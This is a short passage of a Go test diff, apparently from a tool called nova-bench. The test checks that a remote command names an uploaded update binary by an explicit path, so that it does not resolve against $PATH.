+	if first != "~/nova-bench/build/v0.16.0/linux-amd64/nova-update" {
+		t.Fatalf("the remote command does not name the sent binary by path: %q", first)
+	}
+	if !strings.HasPrefix(first, "/") && !strings.HasPrefix(first, "~/") {
+		t.Fatalf("the remote binary would resolve against $PATH: %q", first)
 	}
 }
